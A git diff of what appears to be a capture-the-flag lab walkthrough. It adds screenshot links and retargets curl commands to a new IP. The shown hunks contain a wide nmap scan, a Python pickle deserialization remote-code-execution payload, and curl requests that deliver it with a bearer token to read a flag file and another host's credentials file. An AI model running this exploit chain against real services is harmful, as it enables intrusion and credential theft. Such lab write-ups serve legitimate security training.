@@ -91,6 +91,7 @@ nmap -p 22,2049 --open 195.0.0.0/8 --min-rate 2000
 Also note M5's IP for NFS mount in Step 6 of M5.
 
 ## OR
+<img width="818" height="399" alt="image" src="https://github.com/user-attachments/assets/e9b6bb1c-c16b-4b0c-9a78-19ad57a88272" />
 
 ```python
 # STEP 1: Generate payload file 
@@ -108,13 +109,17 @@ echo "[*] Payload generated:"
 cat /tmp/payload.txt
 ```
 
+<img width="872" height="464" alt="image" src="https://github.com/user-attachments/assets/4b1929b9-67b6-4059-b1f6-1c115eacf975" />
+
+
 ```python
 # STEP 2: Send payload 
-curl -s -X POST http://172.24.4.209:5000/api/signal/process \
+curl -s -X POST http://195.0.0.58:5000/api/signal/process \
   -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
   -H "Content-Type: application/json" \
   -d "{\"payload\":\"$(cat /tmp/payload.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
 ```
+<img width="1070" height="166" alt="image" src="https://github.com/user-attachments/assets/f72de234-a30a-4fe8-b49d-916c6238fe63" />
 
 ```python
 # Read flag4.txt
@@ -128,11 +133,12 @@ class RCE:
 print(base64.b64encode(pickle.dumps(RCE())).decode())
 PYEOF
 
-curl -s -X POST http://172.24.4.209:5000/api/signal/process \
+curl -s -X POST http://195.0.0.58:5000/api/signal/process \
   -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
   -H "Content-Type: application/json" \
   -d "{\"payload\":\"$(cat /tmp/p_flag.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
 ```
+<img width="1419" height="334" alt="image" src="https://github.com/user-attachments/assets/25637b31-7ee3-4017-a94b-a348902e75fd" />
 
 ```python
 # Read archive.conf (M5 credentials) 
@@ -146,8 +152,10 @@ class RCE:
 print(base64.b64encode(pickle.dumps(RCE())).decode())
 PYEOF
 
-curl -s -X POST http://172.24.4.209:5000/api/signal/process \
+curl -s -X POST http://195.0.0.58:5000/api/signal/process \
   -H "Authorization: Bearer DSRT-SIG-4a7f2c91" \
   -H "Content-Type: application/json" \
   -d "{\"payload\":\"$(cat /tmp/p_creds.txt)\",\"format\":\"binary\",\"source\":\"COL-A1\"}"
 ```
+<img width="1462" height="360" alt="image" src="https://github.com/user-attachments/assets/8032aef9-b281-4734-9f76-5e6e347a527b" />
+
